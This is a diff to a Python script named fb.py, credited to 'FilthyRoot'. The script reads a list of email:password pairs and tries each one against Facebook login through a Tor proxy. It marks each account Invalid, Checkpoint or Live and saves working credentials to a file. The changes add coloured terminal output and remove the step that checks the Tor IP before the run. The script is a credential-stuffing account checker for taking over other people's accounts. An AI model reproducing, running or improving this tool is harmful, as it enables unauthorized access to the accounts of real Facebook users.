@@ -2,6 +2,11 @@
 
 import mechanize,sys,re,socks,socket
 
+green  = '\033[92m'
+white  = '\033[97m'
+red    = '\033[91m'
+yellow = '\033[93m'
+
 #TOR Configuration
 proxy = "127.0.0.1" 
 port  = 9050
@@ -23,6 +28,7 @@ def check_ip():
 	return x.read()
 
 def banner():
+	print(white)
 	print('''
 ...............
 .  Facebook   .   Code by FilthyRoot
@@ -51,7 +57,6 @@ if len(sys.argv) < 2:
 	banner()
 	print("Usage : python3 fb.py [empass.txt] [output.txt]")
 else:
-	check_ip()
 	banner()
 	empass = sys.argv[1]
 	f = open(empass, "r")
@@ -62,12 +67,12 @@ else:
 		try:
 			content = login(z[0],z[1])
 			if re.search("/login/device-based/regular/login/",content):
-				print("[x] Invalid " + z[0])
+				print(red + "[x] Invalid " + white + z[0])
 			elif re.search("recover",content) or re.search("checkpoint", content):
-				print("[*] Checkpoint " + z[0])
+				print(yellow + "[*] Checkpoint " + white + z[0])
 				write_log(sys.argv[2], z[0] + "|" + z[1] + "|" + content + "\n")
 			else:
-				print("[+] Live " + z[0])
+				print(green + "[+] Live " + white + z[0])
 				write_log(sys.argv[2], z[0] + "|" + z[1] + "|" + content + "\n")
 		except:
 			pass
